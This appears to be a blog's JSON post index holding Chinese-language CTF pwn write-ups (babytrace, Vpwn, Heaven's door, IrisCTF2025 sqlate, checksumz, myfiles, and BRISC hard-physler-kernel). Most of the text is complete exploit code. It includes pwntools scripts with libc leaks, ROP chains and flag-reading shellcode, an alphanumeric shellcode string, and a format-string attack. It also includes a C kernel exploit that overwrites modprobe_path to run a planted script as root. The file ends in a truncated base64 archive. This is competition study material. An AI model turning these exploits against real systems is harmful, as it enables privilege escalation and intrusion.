&amp;&amp; (stat_loc &amp; 0xFF00) &gt;&gt; 8 == 11 )      break;    if ( ptrace(PTRACE_GETREGS, (unsigned int)pid, 0LL, &amp;v7) &lt; 0 )      error(\"GETREGS error\");    if ( v7.orig_rax != 1 &amp;&amp; v7.orig_rax != 231 &amp;&amp; v7.orig_rax != 5 &amp;&amp; v7.orig_rax != 60 )    {      if ( v7.orig_rax )      {        printf(\"bad syscall: %llu\\n\", v7.orig_rax);        v7.orig_rax = 0xFFFFFFFFFFFFFFFFLL;        if ( ptrace(PTRACE_SETREGS, (unsigned int)pid, 0LL, &amp;v7) &lt; 0 )          error(\"SETREGS error\");      }    }    ptrace(PTRACE_SYSCALL, (unsigned int)pid, 0LL, 0LL);    if ( waitpid(pid, &amp;stat_loc, 0x40000000) &lt; 0 )      error(\"waitpid error3\");  }  while ( (stat_loc &amp; 0x7F) != 0 &amp;&amp; ((unsigned __int8)stat_loc != 127 || (stat_loc &amp; 0xFF00) &gt;&gt; 8 != 11) );只允许一下系统调用号，否则替换成 0xFFFFFFFFFFFFFFFFLL​#define __NR_read 0#define __NR_write 1#define __NR_fstat 5  # 32位情况下是 open#define __NR_exit_group 231# /usr/include/x86_64-linux-gnu/asm/unistd_64.h‍分析子进程size_t get_int(){  char s[40]; // [rsp+0h] [rbp-30h] BYREF  size_t canary; // [rsp+28h] [rbp-8h]  canary = __readfsqword(0x28u);  fgets(s, 32, stdin);  return strtoll(s, 0LL, 10);}int menu(){  return printf(\"choose one &gt;\");}void show(size_t *nums){  size_t idx; // [rsp+18h] [rbp-8h]  if ( show_count &gt; 1 )  {    puts(\"permission denied!\");  }  else  {    puts(\"which one?\");    idx = get_int();    if ( idx &gt; 2 )      exit(1);    printf(\"num[%lld] = %lld\\n\", idx, nums[idx]);    ++show_count;  }}void edit(size_t *nums){  size_t idx; // [rsp+10h] [rbp-220h]  char buf[520]; // [rsp+20h] [rbp-210h] BYREF  size_t canary; // [rsp+228h] [rbp-8h]  canary = __readfsqword(0x28u);  if ( edit_count == 1 )  {    puts(\"recv:\");    read(0, buf, 0x200uLL);    puts(\"which one?\");    idx = get_int();    if ( idx &gt; 2 )      exit(1);    puts(\"set value?\");    nums[idx] = get_int();    puts(\"Set up for success!\");    edit_count = 0;  }  else  {    puts(\"permission denied!\");  }}void is_main(){  int v0; // eax  size_t nums[3]; // [rsp+10h] [rbp-20h] BYREF  size_t canary; // [rsp+28h] [rbp-8h]  canary = __readfsqword(0x28u);  memset(nums, 0, sizeof(nums));  while ( 1 )  {    while ( 1 )    {      menu();      v0 = get_int();      if ( v0 != 2 )        break;      show(nums);    }    if ( v0 == 3 )      exit(1);    if ( v0 == 1 )      edit(nums);    else      puts(\"invild.\");  }}无论时 show 还是 edit 功能都限制不能大于2， 但是负数也可以用漏洞利用通过2  show 功能 可以泄露 libc 和 程序基地址，然后用 edit 负向修改 edit 的返回地址为以下，就可以得到一个缓冲区溢出漏洞，后面就是ROP了​​from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = '119.45.238.17:9999'binary = './babytrace'binary = './fix/babytrace'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libcelf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''#brva 0x0D68brva 0x000D3C#continue'''.format(**locals())#io = rmote()io = start([])def edit(buf,idx,data):    ru('choose one &gt;')    sl('1')    ru(':')    s(buf)    ru('which one?')    sl(str(idx))    ru('set value?')    sl(str(data))def show(idx):    ru('choose one &gt;')    sl('2')    ru('which one?')    sl(str(idx))sleep(0.4)gdb.attach(io.pid+1,gdbscript)#pause()show(-2)ru('num[-2] = ')libc_base = int(rl()) - libc.sym['_IO_2_1_stderr_']lss('libc_base')show(-3)ru('num[-3] = ')                                                                                                                                                                                                                                                                                                                                                       elf_base = int(rl()) - 3656lss('libc_base')lss('elf_base')buf = flat({                                                                                                                                                                                                                                                                                                                                                               0x1F8:0x123456},filler=b'\\x00')idx = -3data = elf_base + 0x00C75 # readedit(buf,idx,data)libc.address = libc_baselibc_rop = ROP(libc)rax = libc_rop.find_gadget(['pop rax','ret'])[0]rbx = libc_rop.find_gadget(['pop rbx','ret'])[0]rcx = libc_rop.find_gadget(['pop rcx','ret'])[0]                                                                                                                                                                                                                                                                                                                       rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]rdx = libc_rop.find_gadget(['pop rdx','ret'])[0]syscall = libc_rop.find_gadget(['syscall','ret'])[0]pay  = b'C' * 0x1d8pay += p64(rdx) + p64(0x500) # 上面的ROP 不是很够用，所用再构造一个大的pay += p64(libc.sym['read'])s(pay)pause()pay  = b'C' * 0x1f0pay += p64(0xbeefbeef)s(pay)itr()‍‍exploit用 int1​ 或 int3​ 去中断,只要执行过 中断后， 后面执行的syscall 就没有父进程的限制了（可能时父进程停止了？）➜  babytrace ROPgadget --binary ./libc.so.6 |grep \": int1 ; ret\"0x00000000000c6d6e : int1 ; ret‍# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = '119.45.238.17:9999'binary = './babytrace'#binary = './fix/babytrace'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libcelf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''#brva 0x0D68brva 0x000D3C#continue'''.format(**locals())#io = rmote()io = start([])def edit(buf,idx,data):    ru('choose one &gt;')    sl('1')    ru(':')    s(buf)    ru('which one?')    sl(str(idx))    ru('set value?')    sl(str(data))def show(idx):    ru('choose one &gt;')    sl('2')    ru('which one?')    sl(str(idx))sleep(0.4)#gdb.attach(io.pid+1,gdbscript)#pause()show(-2)ru('num[-2] = ')libc_base = int(rl()) - libc.sym['_IO_2_1_stderr_']lss('libc_base')show(-3)ru('num[-3] = ')elf_base = int(rl()) - 3656elf.address = elf_baselss('libc_base')lss('elf_base')buf = flat({    0x1F8:0x123456},filler=b'\\x00')idx = -3data = elf_base + 0x00C75 # readedit(buf,idx,data)libc.address = libc_baselibc_rop = ROP(libc)rax = libc_rop.find_gadget(['pop rax','ret'])[0]rbx = libc_rop.find_gadget(['pop rbx','ret'])[0]rcx = libc_rop.find_gadget(['pop rcx','ret'])[0]rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]rdx = libc_rop.find_gadget(['pop rdx','ret'])[0]syscall = libc_rop.find_gadget(['syscall','ret'])[0]int1_ret = libc_base + 0x00000000000c6d6e #: int1 ; retpay  = b'C' * 0x1d8pay += p64(rdx) + p64(0x500)pay += p64(libc.sym['read'])s(pay)bss = elf.bss() &gt;&gt; 0xC &lt;&lt; 0xCpause()pay  = b'C' * 0x1f0pay += p64(rax) + p64(0)pay += p64(rdi) + p64(0)pay += p64(rsi) + p64(bss)pay += p64(rdx) + p64(0x300)pay += p64(syscall)pay += p64(int1_ret)pay += p64(rax) + p64(0xa)pay += p64(rdi) + p64(bss)pay += p64(rsi) + p64(0x100)pay += p64(rdx) + p64(7)pay += p64(syscall)pay += p64(bss)s(pay)pause()sc  = asm(shellcraft.open('/flag'))sc += asm(shellcraft.sendfile(1,'rax',0,0x50))sl(sc)itr()‍‍​​‍参考链接‍https://ctftime.org/writeup/20115‍Pwn-Vpwn‍# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = '139.155.126.78:27968'binary = './Vpwn'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libc#elf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''#continue'''.format(**locals())#io = rmote()io = start([])def edit(idx,data):    ru(b'Enter your choice: ')    sl('1')    ru(':')    sl(str(idx))    ru(':')    sl(str(data))def push(pay):    ru(b'Enter your choice: ')    sl('2')    ru(b'Enter the value to push: ')    sl(str(pay))def pop():    ru(b'Enter your choice: ')    sl('3')def show():    ru(b'Enter your choice: ')    sl('4')push(0x41414141)push(0x42424242)push(0x42424242)push(0x42424242)push(0x42424242)push(0x42424242)push(20)show()ru('StackVector contents: ')data = rl().decode().strip().split(' ')print(data)d1 = int(data[-1])d2 = int(data[-2]) %0x100000000libc_base = d1 &lt;&lt; 0x20libc_base += d2libc_base -= 171408lss('d1')lss('d2')lss('libc_base')libc.address = libc_basesystem = libc.sym['system']bin_sh = next(libc.search(b'/bin/sh'))pop_rdi = next(libc.search(asm('pop rdi;ret')))pop()pop()push((pop_rdi+1) &amp; 0xFFFFFFFF)push((pop_rdi+1) &gt;&gt; 0x20)push((pop_rdi) &amp; 0xFFFFFFFF)push((pop_rdi) &gt;&gt; 0x20)push((bin_sh) &amp; 0xFFFFFFFF)push((bin_sh) &gt;&gt; 0x20)push((system) &amp; 0xFFFFFFFF)#gdb.attach(io,gdbscript)push((system) &gt;&gt; 0x20)sl('5')#push((pop_rdi+1) &amp; 0xFFFFFFFF)#show()#edit(-1,0x45454545)#pay = flat({#},filler=b'\\x00')itr()‍Pwn-Heaven’s door‍​​‍  懒得去写 xor 了，直接 字符shellcode 一把梭Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2E0T2I0Q030z3P3G1P3r123V2p01187l0B1k0R0r2H1k010r2n0w0A3i108N0R00060Z2r0o11092j7o0w0X0I0n110p0k0x3k3d14012O7o0D03‍from pwn import *context.arch='amd64'sc  = asm(shellcraft.open('flag'))sc += asm(shellcraft.mmap(0,0x50,7,2,3,0))sc += asm(shellcraft.write(1,'rax',0x40))open('shellcode','wb').write(sc)# python3 $1 &gt;shellcode# python2 ./ALPHA3.py x64 ascii mixedcase rax --input=\"shellcode\"# python2 ./ALPHA3.py x64 ascii mixedcase rdx --input=\"shellcode\""
  },
  
  {
    "title": "IrisCTF2025-Pwn-Binary-Exploitation-WriteUps",
    "url": "/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/",
    "categories": "",
    "tags": "",
    "date": "2025-01-07 00:00:00 +0800",
    





    
    "snippet": "  This IrisCTF2025 binary vulnerability exploitation report was written by imLZH1, a member of the “Just For the Questions” teamsqlateint main(void) {  \t......    init_admin();    login_anonymous()...",
    "content": "  This IrisCTF2025 binary vulnerability exploitation report was written by imLZH1, a member of the “Just For the Questions” teamsqlateint main(void) {  \t......    init_admin();    login_anonymous();\t......\tdo{\t\t......        switch (c) {          \t......            case '5': {                printf(\"Registration is currently closed.\\n\\n\");                action_login();                continue;            }           ......            case '7': {                if (!check_permissions(permission_root)) continue;                action_sys();                continue;            }\t\t\t......        }    } while(true);}void action_sys() {    system(\"/usr/bin/cat flag\");}// 脆弱点void action_login() {    // Currently only admin login    read_to_buffer(\"Password?\");    unsigned long length = strlen(line_buffer);\t// line_buffer 是我们的输入    for (unsigned long i = 0; i &lt; length &amp;&amp; i &lt; 512; i++) {        if (line_buffer[i] != admin_password[i]) {            printf(\"Wrong password!\\n\");            return;        }    }\t// 上面输入 \\x00\\x00 可以使length 等于 0，可以直接跳过 for循环，来到这里    strcpy(current_user.username, \"admin\");    current_user.userId = 0;    current_user.flags = 0xFFFFFFFF;}  exploitfrom pwn import *# from ctypes import CDLL# cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')# imLZH1s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'sqlate.chal.irisc.tf:10000'binary = './vuln'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libc#elf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''b *action_login#continue'''.format(**locals())io = start([])#gdb.attach(io,gdbscript)`Yru('&gt; ')sl('5')#pause()sl('\\x00\\x00') # 绕过登录ru('&gt; ')sl('7') # cat flag#pay = flat({#},filler=b'\\x00')itr()checksumz分析  解决这道题的过程中我学到了很多东西‍$ modinfo ./artifacts/vuln.ko filename:       /opt/kernel_chall/2025-irisctf-Checksumz/./artifacts/vuln.kolicense:        GPLauthor:         LambdaXCF &lt;hello@lambda.blog&gt;description:    /dev/checksumz: a vulnerable kernel moduledepends:    retpoline:      Yname:           vulnvermagic:       6.10.10 SMP preempt mod_unload这个kernel 驱动大概有 4 个主要的调用lseekwritereadioctl虽然是 iter​ 但是也可以通过 read 和 write 调用​​struct_name = '''owner fop_flags llseek read write read_iter write_iter iopoll iterate_shared poll unlocked_ioctl compat_ioctl mmap open flush release fsync fasync lock get_unmapped_area check_flags flock splice_write splice_read splice_eof setlease fallocate show_fdinfo mmap_capabilities copy_file_range remap_file_range fadvise uring_cmd uring_cmd_iopoll'''struct_name = struct_name.split(' ')fops_address = 0x600ida_name.set_name(fops_address, 'fops')for offset in range(0, len(struct_name)):    next_ptr = ida_bytes.get_qword(fops_address + offset * 8)    if(next_ptr):        sname = 'device_' + struct_name[offset]        ida_name.set_name(next_ptr, sname)        print(hex(next_ptr),' --&gt; ',sname)​​‍  驱动程序checksum_buffer结构体struct checksum_buffer {    loff_t pos;    char state[0x200];    size_t size;    size_t read;    char* name;    uint32_t digest;};  checksum 几个函数// 初始化 checksum_buffer 结构体__int64 __fastcall device_flush(inode *inode, file *file){  checksum_buf *v2; // rax  __int64 v3; // rdi  checksum_buf *v4; // rbx  char *v5; // rax  size_t size; // rdx  v2 = (checksum_buf *)kmalloc_trace_noprof(kmalloc_caches[10], 0xDC0LL, 0x228LL);  v3 = kmalloc_caches[10];  file-&gt;private_data = v2;  v4 = v2;  v2-&gt;pos = 0LL;  v2-&gt;size = 0x200LL;  v2-&gt;read = 0LL;  v5 = (char *)kmalloc_trace_noprof(v3, 0xDC0LL, 0x3E8LL);  size = v4-&gt;size;  *(_QWORD *)&amp;v4-&gt;digest = 1LL;  v4-&gt;name = v5;  *(_QWORD *)v5 = 0x746C7561666564LL;  if ( size )    memset(v4-&gt;state, 0, size);  return 0LL;}                                               // initssize_t device_llseek(size_t *file, size_t user_buffer, size_t length, loff_t *offset){  checksum_buf *v4; // rcx  ssize_t result; // rax  size_t size; // rdx  unsigned __int64 v7; // rsi  v4 = (checksum_buf *)file[0x19];\t......  else  {\t....    v4-&gt;pos = (size_t *)user_buffer;            // 直接设置 pos 的值    size = v4-&gt;size;    result = user_buffer;  }  v7 = result;  ...  if ( v7 &gt;= size )  {    result = size - 1;    v4-&gt;pos = (size_t *)(size - 1); pos最大 只能为 0x1FF  }  return result;}ssize_t __fastcall device_write_iter(kiocb *iocb, iov_iter *from){  __kernel_size_t iov_len; // rsi  checksum_buf *private_data; // rbx  ssize_t result; // rax  __int64 v6; // rax  __int64 v7; // rbp  char *PTR; // r13  size_t size; // rsi  size_t *v10; // rdx  iov_len = from-&gt;__ubuf_iovec.iov_len;  private_data = (checksum_buf *)iocb-&gt;ki_filp-&gt;private_data;  if ( !private_data )    return -77LL;  result = 0LL;  if ( iov_len )  {    v6 = 0x10LL;    if ( iov_len &lt;= 0x10 )                      // 最大是 0x10 legnth      v6 = iov_len;    v7 = v6;    PTR = &amp;private_data-&gt;state[(unsigned __int64)private_data-&gt;pos]; // 漏洞点    ......    result = copy_from_iter(PTR, v7, from);     ......  }  return result;}struct checksum_buffer {    loff_t pos;  // 是 0x1ff    char state[0x200];    size_t size=0x200; // MAX Size - 1    size_t read;    char* name;    uint32_t digest;};PTR = &amp;private_data-&gt;state[0x1ff];copy_from_iter(PTR, v7, from); copy 0x10个字节，可以把 checksum_buffer-&gt;size 覆盖，后面由于没有 size的现在，可以 直接 set pos 任意大小​0xfffffe00000002e4​ 在kernel是固定的一个地址，里面有 vmlinux 的地址，可以把 name 指针覆盖成 它，然后再查看name 泄露出来，从而泄露 vmlinux kernel 的地址exploit#include \"api.h\"#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;sys/uio.h&gt; //  struct iovecint fd;/*----------ioctl----------*/void set_name(char *buf){    ioctl(fd, 0xC0084000, buf);}void show_digest(char *buf){    ioctl(fd, 0xC0084003, buf);}void set_size(size_t size){    ioctl(fd, 0xC0044002, size);}void check(){    ioctl(fd, 0x4001, 0);}/*----------llseek----------*/add_pos(size_t size){    syscall(8, fd, size, 1);}sub_pos(size_t size){    syscall(8, fd, size, 2);}set_pos(size_t size){    syscall(8, fd, size, 0);}/*----------write----------*/write_iter(size_t *buf, size_t size){    write(fd, buf, size);}read_iter(size_t *buf, size_t size){    read(fd, buf, size);}int main() {    system(\"echo -ne '#!/bin/sh\\n/bin/chmod 777 /root /dev/vda\\n' &gt; /tmp/e1\");    system(\"chmod +x /tmp/e1\");    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' &gt; /tmp/e2\");    system(\"chmod +x /tmp/e2\");    fd = open(\"/dev/checksumz\", 2);    size_t buf[0x1000/8];    set_pos(0x200);    //read_iter(buf, 0);    buf[0] = 0xFFFFFFFFFFFF;    buf[1] = 0xFFFFFFFFFFFF;    write_iter(buf, 0x10);    set_pos(0x210);    read_iter(buf, 8);    size_t heap_addr = buf[0];    printf(\"heap_addr = %p\\n\",heap_addr);    size_t kernel_in = 0xfffffe00000002e4;    size_t tmp = heap_addr - kernel_in;    printf(\"offset = %p\\n\");    buf[0] = 0xFFFFFFFFFFFFFFF;    buf[1] = 0xFFFFFFFFFFFFFFF;    set_pos(0x200);    write_iter(buf, 8);    set_pos(0x10000000000000000 - tmp);    read_iter(buf, 0x10);    size_t kernel_base = buf[1] - 0x1008e00;    size_t modprobe = kernel_base + 0x1b3f100;    printf(\"kernl_base = %p\\n\",kernel_base);    printf(\"modprobe = %p\\n\", modprobe);    int offset = (buf[0] &gt;&gt; 0x20) - 0x100320 + 8;    printf(\"offset = %p\\n\",offset);    size_t base_addr = heap_addr + offset;    printf(\"base_addr = %p\\n\",base_addr);    size_t modprobe_offset = modprobe - base_addr;    printf(\"modprobe_offset = %p\\n\",(modprobe_offset));    set_pos(modprobe_offset);    write_iter(\"/tmp/e1\\x00\", 0x10);    exit(0);    return 0;}  大概1/2 吧？​​exploit利用过程分析将用户的数据 copy 到 kernel 里​​size_t copy_from_iter(void *kernel_addr, size_t bytes, struct iov_iter *user_iov_iter);struct iov_iter {\tu8 iter_type;\tbool nofault;\tbool data_source;  // 0x10 : stack addr\tsize_t iov_offset; // 0x18 : length\t....}​​copy 后 可以看到， size处已经被覆盖成 big number​​‍‍‍  read 去读 泄露 heap_addr, 泄露heap 地址 后面后会用到​​‍  rest size （有重新改了一下size， 应该无所谓）​​​​​​‍‍  泄露地址 这里就需要利用 heap_addr 了size_t kernel_in = 0xfffffe00000002e4;size_t tmp = heap_addr - kernel_in;set_pos(0x10000000000000000 - tmp);read_iter(buf, 0x10);int offset = (buf[0] &gt;&gt; 0x20) - 0x100320 + 8;// 泄露的 来的不一定是0x10032000000000，但是可以通过这个和泄露出来的值去做一个计算，就可以拿到 实际上 的 heap_addr的起始// 从而 为后面寻找 modprobe_path 做更精确的计算​​‍读数据​​​​‍已经把数据放到 stack 了​​‍  有了 kernel vmlinux 的地址 ，就可以计算 modprobe_path 的地址了 然后就直接覆盖​​​​‍‍  pwn!​​‍  都做完了我才想起来，可以直接覆盖 name 指针 设置成 modprobe_path, 然后直接修改，我上面是通过他们的偏移去算的，还麻烦一点，我傻逼了myfiles‍分析  漏洞点， 如何 v6 是一个负数​​‍  调试查看​​每次计算 0x10 长度的 hash , 已知前面的 文件 invitecode.txt​ 后面两位 爆破即可​​‍‍​​‍‍‍exploit‍from pwn import *# from ctypes import CDLL# cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')# imLZH1s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'myfiles.chal.irisc.tf:10001'binary = './chal'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libc#elf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''#continuebrva 0x023B7brva 0x023F8'''.format(**locals())io = start([])#pay = flat({#},filler=b'\\x00')def listUser():    ru('&gt; ')    sl('1')def listFiles(uid):    ru('&gt; ')    sl('2')    ru('id? ')    sl(str(uid))def createUser(unm, pwd, code):    ru('&gt; ')    sl('3')    ru('code? ')    sl(code)    ru('? ')    sl(unm)    ru('? ')    sl(pwd)def uploadFile(uid, zip_hex):    ru('&gt; ')    sl('4')    ru('to? ')    sl(str(uid))    ru('file\\n')    sl(zip_hex)def viewFile(uid, pwd,fid):    ru('&gt; ')    sl('5')    ru('? ')    sl(str(uid))    ru('? ')    sl(pwd)    ru('? ')    sl(str(fid))import zipfileimport io as io2def gen_zip(text,fname='text.txt'):    zip_buffer = io2.BytesIO()    fd = zipfile.ZipFile(zip_buffer, 'w', compression=zipfile.ZIP_STORED)    fd.writestr(fname, text)    zip_raw_data = zip_buffer.getvalue()    zip_buffer.close()    print(zip_raw_data.hex())    return zip_raw_data.hex()def fnv1a_hash(data):    v5 = 0xCBF29CE484222325    for byte in data:        v5 = (0x100000001B3 * (byte ^ v5)) &amp; 0xFFFFFFFFFFFFFFFF  # 64-bit mask    return v5def gen_raw_zip(idx):    pay = flat({        0x00:p32(0x4034B50),        0x08:p16(0x0), # is encryp?        0x12:p32(0x10), # text size        0x1A:p32(idx), # file name size     },filler=b'\\x00')    return pay.hex().ljust(1022,'4')for i in range(1,0x20):    uploadFile(15, gen_raw_zip(0x100000000-0x200*i-4-(2*(i-1))))# gdb.attach(io,'brva 0x017FF')listFiles(15)hash_l = []for i in range(31):    ru('  16 ')    hash_l.append( int(rl().decode().strip(),16))print(hash_l)base = b'invitecode.txt'dic = []for x in range(32,127):    for y in range(32,127):        pad = p8(x) + p8(y)        dic.append(pad)me_find = b''for h in hash_l:    for pad in dic:        tmp = base + pad        if fnv1a_hash(tmp) == h:            me_find += pad            base = tmp[2:]            print(me_find)            breakinvitecode = me_findcreateUser('hack1','pwd1',invitecode)uploadFile(0, gen_zip('--%8$p--sssss'))viewFile(0,'pwd1',0)ru('--')elf_base = int(ru('--')[:-2],16)lss('elf_base')pay  = b''pay += b'A%15$hhn'pay += p64(elf_base + 0x10)uploadFile(0, gen_zip(pay))viewFile(0,'pwd1',1)ru('&gt; ')sl('6')ru('? ')sl('0')ru('? ')sl('pwd1')g2 = '''brva 0x00183D'''itr()➜  myfiles ‍‍​​"
  },
  
  {
    "title": "2024-BRISC-CTF-Pwn-WriteUps",
    "url": "/posts/BRISC-CTF/",
    "categories": "",
    "tags": "",
    "date": "2025-01-07 00:00:00 +0800",
    





    
    "snippet": "hard-physler-kernel非预期做法  权限没设置好，全部都时 rwx​​把 /bin/busybox 文件覆盖，然后 exit​​  exploit#include \"minilib.h\"extern void _start(){    char *files[] = {        \"/flag\",        \"/flag.txt\",        \"/root/fla...",
    "content": "hard-physler-kernel非预期做法  权限没设置好，全部都时 rwx​​把 /bin/busybox 文件覆盖，然后 exit​​  exploit#include \"minilib.h\"extern void _start(){    char *files[] = {        \"/flag\",        \"/flag.txt\",        \"/root/flag\",        \"/root/flag.txt\",        0};    for(int i=0;files[i];i++){        int fd = open(files[i],0);        if(fd&gt;0){            sendfile(1, fd, 0, 0x100);        }    }    syscall64(60,0);}//UEsDBBQAAAAIAOd2IVr0kO2YrAMAACglAAAHABwAZXhwbG9pdFVUCQAD0uZ0Z9LmdGd1eAsAAQQAAAAABAAAAADtWktrE1EUPol9pEVtFEXBIqMEqUin6cNWi49oO+0VWkUlC1EJSTNtCnmUZAZabXVRFK9B6Ur7C4obXzt10RaLNrqqG+mym0pAwYoFixTjvTN3kpkp8YUIwv3InXPPOd93zmQmWUxyrkpdHU6HAww44QhQ747bp/k+Fr+3O08hsQNQTo6VUKFxS8AMn8Wud4LFgls3VFdq8oH1M6zETsmwZp3WT2BxwWe1Bt+mK2Erw+IZh89i8+WYdYFVl2W6LOMb1sN4HhOf4uyiEv6TfqeJrgx+HcblK2F7ek07T/rJfYRpGltnym9hPs1PBBpntr8b2e86ef9u5hTedvzNVOtvtOXg4ODg4ODg4ODg4OD4z/C5audXP8KLCK8g/AXhtwi/7sbPu3GmK93lcVWVjl2cyXNGP7gRHlnB6nLav4zSEpG8nKIP9k9oqeyjXC73yswWKBthdQlhfxbh7gWUVsnqzqK0f4nqT+AlWqImXyJGSoxZanjRrdLbVQAIS3Nki/XtPNne0LcLhW0WzUpLtM6stErNe19aWkXjKN3+Ym6SBhCezYqkBZZWRkdW4Eo1fQ/jT+mPBc/0/Msp+sCebSGkUWnVUdCja9PqY63I1KH86U5+0073394yDg4ODg4ODg4ODg4ODo7fRioCtT1QF+qP15FtJXjrGxqb9je3HDh47Hhbu9QBFcJhAQTyIge6hkGEYajrjQb79KOoDCpQl0wkFBbMb7UMwxZmHZfOgGPQ7dixvtw1Rh61q0Ffgx9zOe0/dGmj+7qzbUPZeUJgOfq8PUzyojkvF/IXyLpJ8u3m/OVCfpisByT/0Jx3TmiEzra2VqHGH1LjiirUN4qNore2WdXchisNTaK3aS8L//g66nMJn3L2eDlZm53r4Ayba2hn8a0sbsxZPGRxt7ZKAbw+S51qxjfmI4x5gz1F+LVF4g2sjofVEY2EPDgg9kBKjod7+6MyBAKhVCqQUoJJBVJDqZ5gNNrcBAE5HFSCxMTDkBiQ40SfGoopwRCxSlK3EWMXTyiy2BdXxYEk4SaVIVMopPZHw7X9YRAVmXxIxGRCKyzKkUBvMhiTQexJxGJyXIG/hB2g3wtjDKUwj6H7go3vsvmiTV+YA9F9j41fYvOPgf4Zyc925OdddCM5rHybC50sZvQvzL3oJmjj2/WnbPoI00eYftzGt7//c0y/5muwSzf7ivQ3WyeshZfp5019nab+25mtgMIsi+